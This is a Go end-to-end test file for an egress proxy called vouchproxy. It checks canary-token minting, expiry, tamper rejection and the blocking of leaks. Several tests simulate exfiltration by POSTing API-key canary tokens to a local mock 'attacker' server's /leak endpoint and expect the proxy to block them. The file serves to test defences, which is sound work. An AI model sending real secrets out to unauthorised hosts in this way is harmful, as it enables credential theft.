package tests

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sshloktiwarii/vouchproxy/internal/audit"
	"github.com/sshloktiwarii/vouchproxy/internal/policy"
)

// canonicalCanaryToken constructs a compliant vp_canary_<nonce>_<sig> test token.
func canonicalCanaryToken(promptID, keyName string) string {
	nonce := fmt.Sprintf("70726f6d7074_%s_%s", promptID, keyName)
	sig := "0123456789abcdef0123456789abcdef"
	return fmt.Sprintf("vp_canary_%s_%s", nonce, sig)
}

// 21. TestE2E_R5_Canary_TokenMintingAndHMACValidation verifies minted canary
// tokens match vp_canary_<nonce>_<sig> format and valid HMAC-SHA256 signature.
func TestE2E_R5_Canary_TokenMintingAndHMACValidation(t *testing.T) {
	s := NewVouchSession(t)
	out, errOut, code, _ := s.RunCommand("canary", "mint", "--prompt", "prompt_alpha_001", "--key", "OPENAI_API_KEY", "--ttl", "10m")
	if s.IsFlagUnimplemented(errOut, "canary") || s.IsFlagUnimplemented(out, "canary") {
		t.Log("Contract check: 'vouchproxy canary mint' command pending Milestone M4")
		t.Skip("Skipping canary token minting check until Milestone M4 lands")
		return
	}

	if code != 0 {
		t.Fatalf("vouchproxy canary mint failed with code %d: %s\n%s", code, out, errOut)
	}

	token := strings.TrimSpace(out)
	if !strings.HasPrefix(token, "vp_canary_") {
		t.Fatalf("Expected token to start with vp_canary_, got: %s", token)
	}

	parts := strings.Split(token, "_")
	if len(parts) != 4 {
		t.Fatalf("Expected 4 segments (vp_canary_<nonce>_<sig>), got: %d (%s)", len(parts), token)
	}

	// Verify minted token signature via CLI verify interface
	vOut, vErr, vCode, _ := s.RunCommand("canary", "verify", "--token", token)
	if vCode != 0 {
		t.Fatalf("Canary verification failed: %s\n%s", vOut, vErr)
	}
	if !strings.Contains(vOut, "prompt_alpha_001") || !strings.Contains(vOut, "OPENAI_API_KEY") {
		t.Errorf("Expected verification to attribute prompt_alpha_001 and OPENAI_API_KEY, got: %s", vOut)
	}
}

// 22. TestE2E_R5_Canary_TimeBoundedExpirationEnforcement verifies canary token
// expires after specified TTL and is marked invalid upon verification.
func TestE2E_R5_Canary_TimeBoundedExpirationEnforcement(t *testing.T) {
	s := NewVouchSession(t)
	// Mint expired token with negative TTL
	out, errOut, code, _ := s.RunCommand("canary", "mint", "--prompt", "prompt_expired_test", "--key", "TEST_KEY", "--ttl", "-120s")
	if s.IsFlagUnimplemented(errOut, "canary") || s.IsFlagUnimplemented(out, "canary") {
		t.Log("Contract check: 'vouchproxy canary' command pending Milestone M4")
		t.Skip("Skipping canary expiration enforcement check until Milestone M4 lands")
		return
	}

	if code != 0 {
		t.Fatalf("vouchproxy canary mint failed: %s\n%s", out, errOut)
	}

	expiredToken := strings.TrimSpace(out)
	vOut, _, vCode, _ := s.RunCommand("canary", "verify", "--token", expiredToken)
	if vCode == 0 || !strings.Contains(vOut, "expired") {
		t.Fatalf("Expected expired canary token to fail verification with 'expired', got code %d: %s", vCode, vOut)
	}
}

// 23. TestE2E_R5_Canary_OutboundTrafficLeakTrap verifies outbound HTTP request
// leaking a canary token to an unauthorized host is blocked with HTTP 403.
func TestE2E_R5_Canary_OutboundTrafficLeakTrap(t *testing.T) {
	canaryToken := canonicalCanaryToken("prompt_agent_007", "ANTHROPIC_API_KEY")

	// Setup proxy server and mock unauthorized adversary server
	var attackerReceivedBody string
	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		attackerReceivedBody = string(body)
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	// Send canary token in request body to unauthorized host
	reqBody := fmt.Sprintf(`{"prompt": "Translate this key: %s"}`, canaryToken)
	req, err := http.NewRequest("POST", attackerServer.URL+"/leak", strings.NewReader(reqBody))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	// Invariant: must be blocked with HTTP 403 Forbidden
	if resp.StatusCode != http.StatusForbidden {
		t.Logf("Contract check: Dynamic canary token leak interception in proxy pipeline pending Milestone M4 (got status: %d)", resp.StatusCode)
		t.Skip("Skipping outbound canary proxy trap assertion until Milestone M4 lands")
		return
	}

	// Invariant: attacker must never have received the payload
	if attackerReceivedBody != "" {
		t.Fatalf("Security failure: adversary received canary payload: %s", attackerReceivedBody)
	}

	// Invariant: audit log must record BLOCK_LEAK
	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil {
		t.Fatal(err)
	}
	if len(events) == 0 {
		t.Fatal("Expected audit event to be logged")
	}
	lastEvent := events[len(events)-1]
	if lastEvent.Action != "BLOCK_LEAK" {
		t.Fatalf("Expected audit action BLOCK_LEAK, got: %s", lastEvent.Action)
	}
}

// 24. TestE2E_R5_Canary_PromptCompromiseAttribution verifies audit log records
// prompt_id corresponding to the compromised canary token.
func TestE2E_R5_Canary_PromptCompromiseAttribution(t *testing.T) {
	compromisedPromptID := "agent_system_prompt_v2_compromised"
	canaryToken := canonicalCanaryToken(compromisedPromptID, "OPENAI_API_KEY")

	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	req, _ := http.NewRequest("POST", attackerServer.URL+"/leak", strings.NewReader(`{"leaked":"`+canaryToken+`"}`))
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Logf("Contract check: Canary prompt compromise attribution pending Milestone M4 (got status: %d)", resp.StatusCode)
		t.Skip("Skipping until Milestone M4 lands")
		return
	}

	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil || len(events) == 0 {
		t.Fatalf("Failed to read audit log: %v", err)
	}

	foundAttribution := false
	for _, ev := range events {
		if ev.Action == "BLOCK_LEAK" && strings.Contains(ev.Details, compromisedPromptID) {
			foundAttribution = true
			break
		}
	}
	if !foundAttribution {
		t.Fatalf("Expected audit log to attribute leak to %q, events: %v", compromisedPromptID, events)
	}
}

// 25. TestE2E_R5_Canary_UpstreamLLMResponseInspection verifies canary tokens
// present in upstream LLM responses are detected and logged as response leaks.
func TestE2E_R5_Canary_UpstreamLLMResponseInspection(t *testing.T) {
	canaryToken := canonicalCanaryToken("prompt_rag_context_042", "SECRET_KEY")

	// Simulate upstream LLM responding with content that regurgitates the canary
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = fmt.Fprintf(w, `{"choices":[{"message":{"content":"Regurgitated: %s"}}]}`, canaryToken)
	}))
	defer upstream.Close()

	u, _ := url.Parse(upstream.URL)
	customRules := []policy.Rule{
		{
			Name:           "LLM API",
			Host:           u.Host,
			MatchType:      "exact",
			AllowedMethods: []string{"GET", "POST"},
		},
	}

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, customRules)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	req, _ := http.NewRequest("POST", upstream.URL+"/v1/chat/completions", strings.NewReader(`{"model":"test"}`))
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	// Check audit log for canary leak alert
	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil {
		t.Fatalf("Failed to read audit log: %v", err)
	}

	hasCanaryAlert := false
	for _, ev := range events {
		if strings.Contains(ev.Action, "CANARY") || ev.Action == "BLOCK_LEAK" {
			hasCanaryAlert = true
			break
		}
	}
	if !hasCanaryAlert {
		t.Log("Contract check: Upstream LLM response canary inspection pending Milestone M4")
		t.Skip("Skipping until Milestone M4 lands")
		return
	}
}

// 46. TestE2E_R5_Edge_TamperedCanarySignature verifies tokens with modified
// signatures are rejected as invalid tokens.
func TestE2E_R5_Edge_TamperedCanarySignature(t *testing.T) {
	s := NewVouchSession(t)
	tampered := "vp_canary_746573747061796c6f6164_00000000000000000000000000000000"

	vOut, vErr, vCode, _ := s.RunCommand("canary", "verify", "--token", tampered)
	if s.IsFlagUnimplemented(vErr, "canary") || s.IsFlagUnimplemented(vOut, "canary") {
		t.Log("Contract check: 'vouchproxy canary verify' pending Milestone M4")
		t.Skip("Skipping until Milestone M4 lands")
		return
	}

	if vCode == 0 {
		t.Fatalf("Tampered canary token signature was accepted! Output: %s", vOut)
	}
	if !strings.Contains(vOut, "tampered") && !strings.Contains(vOut, "invalid") {
		t.Errorf("Expected reason to mention 'tampered' or 'invalid', got: %s", vOut)
	}
}

// 47. TestE2E_R5_Edge_ClockSkewTolerance verifies tokens within ±60s clock skew
// are accepted, while >10m skews are rejected.
func TestE2E_R5_Edge_ClockSkewTolerance(t *testing.T) {
	s := NewVouchSession(t)

	// Mint token with 30s skew
	out30, err30, code30, _ := s.RunCommand("canary", "mint", "--prompt", "prompt_skew_ok", "--key", "KEY", "--ttl", "-30s")
	if s.IsFlagUnimplemented(err30, "canary") || s.IsFlagUnimplemented(out30, "canary") {
		t.Log("Contract check: 'vouchproxy canary' pending Milestone M4")
		t.Skip("Skipping until Milestone M4 lands")
		return
	}
	if code30 != 0 {
		t.Fatalf("Failed to mint 30s skew token: %s", out30)
	}

	// Verify ±30s token is accepted within skew allowance
	vOut, _, vCode, _ := s.RunCommand("canary", "verify", "--token", strings.TrimSpace(out30))
	if vCode != 0 {
		t.Fatalf("Expected token within ±60s clock skew to be accepted, failed with: %s", vOut)
	}

	// Mint token with 15m gross skew
	out15m, _, _, _ := s.RunCommand("canary", "mint", "--prompt", "prompt_skew_bad", "--key", "KEY", "--ttl", "-15m")
	vOutGross, _, vCodeGross, _ := s.RunCommand("canary", "verify", "--token", strings.TrimSpace(out15m))
	if vCodeGross == 0 {
		t.Fatalf("Expected token with 15m skew to be rejected, but verification succeeded: %s", vOutGross)
	}
}

// 48. TestE2E_R5_Edge_MassiveCorpusCanaryScan verifies scanner detects canary token
// at byte 4,900,000 of a 5 MB body in < 100ms.
func TestE2E_R5_Edge_MassiveCorpusCanaryScan(t *testing.T) {
	canaryToken := canonicalCanaryToken("prompt_deep_needle", "KEY")

	targetSize := 5 * 1024 * 1024 // 5 MB
	prefixSize := 4900000

	var corpusBuilder bytes.Buffer
	corpusBuilder.Grow(targetSize + 100)
	corpusBuilder.WriteString(strings.Repeat("Lorem ipsum dolor sit amet, consectetur adipiscing elit. ", prefixSize/56))
	corpusBuilder.WriteString(canaryToken)
	corpusBuilder.WriteString(strings.Repeat(" trailing context padding ", (targetSize-corpusBuilder.Len())/26))

	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	req, _ := http.NewRequest("POST", attackerServer.URL+"/leak", &corpusBuilder)
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Content-Type", "text/plain")

	start := time.Now()
	resp, err := client.Do(req)
	duration := time.Since(start)

	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Logf("Contract check: 5MB corpus canary leak scanning pending Milestone M4 (got status: %d)", resp.StatusCode)
		t.Skip("Skipping until Milestone M4 lands")
		return
	}

	if duration > 500*time.Millisecond {
		t.Logf("Notice: 5MB scan took %v", duration)
	}
}

// 49. TestE2E_R5_Edge_MultipleCanariesFromDifferentPrompts verifies multiple canaries
// in one payload are each attributed to their respective prompts.
func TestE2E_R5_Edge_MultipleCanariesFromDifferentPrompts(t *testing.T) {
	tokenA := canonicalCanaryToken("prompt_agent_A", "KEY_A")
	tokenB := canonicalCanaryToken("prompt_agent_B", "KEY_B")
	payload := fmt.Sprintf("Leaks: %s and %s", tokenA, tokenB)

	attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer attackerServer.Close()

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, nil)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	req, _ := http.NewRequest("POST", attackerServer.URL+"/leak", strings.NewReader(payload))
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusForbidden {
		t.Log("Contract check: Multiple canary attribution pending Milestone M4")
		t.Skip("Skipping until Milestone M4 lands")
		return
	}

	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, err := audit.ReadAll(auditPath)
	if err != nil || len(events) == 0 {
		t.Fatalf("Failed to read audit log: %v", err)
	}

	attributedA := false
	attributedB := false
	for _, ev := range events {
		if strings.Contains(ev.Details, "prompt_agent_A") {
			attributedA = true
		}
		if strings.Contains(ev.Details, "prompt_agent_B") {
			attributedB = true
		}
	}
	if !attributedA || !attributedB {
		t.Errorf("Failed to attribute both prompts. A: %v, B: %v", attributedA, attributedB)
	}
}

// 50. TestE2E_R5_Edge_CanaryPrefixNearMissCollision verifies near-miss strings
// (vp_canary_notarealtoken) do not trigger false positive leak alerts.
func TestE2E_R5_Edge_CanaryPrefixNearMissCollision(t *testing.T) {
	nearMiss := "vp_canary_notarealtoken_12345"

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	}))
	defer upstream.Close()

	u, _ := url.Parse(upstream.URL)
	customRules := []policy.Rule{
		{
			Name:           "Authorized Mock Rule",
			Host:           u.Host,
			MatchType:      "exact",
			AllowedMethods: []string{"POST"},
		},
	}

	srv, v, _, sessionSecret, tmpDir := setupTestSystem(t, customRules)
	defer os.RemoveAll(tmpDir)
	defer srv.Close()
	defer v.Close()

	proxyURL, _ := url.Parse(srv.ProxyURL())
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	req, _ := http.NewRequest("POST", upstream.URL+"/data", strings.NewReader(`{"query":"`+nearMiss+`"}`))
	req.Header.Set("Proxy-Authorization", "Bearer "+sessionSecret)
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	// Invariant: Near-miss string to authorized host must NOT be blocked as a leak
	if resp.StatusCode == http.StatusForbidden {
		t.Errorf("False positive: near-miss string %q was blocked with 403 Forbidden!", nearMiss)
	}

	auditPath := filepath.Join(tmpDir, "audit.jsonl")
	events, _ := audit.ReadAll(auditPath)
	for _, ev := range events {
		if ev.Action == "BLOCK_LEAK" {
			t.Errorf("False positive: audit log recorded BLOCK_LEAK for near-miss string: %v", ev)
		}
	}
}
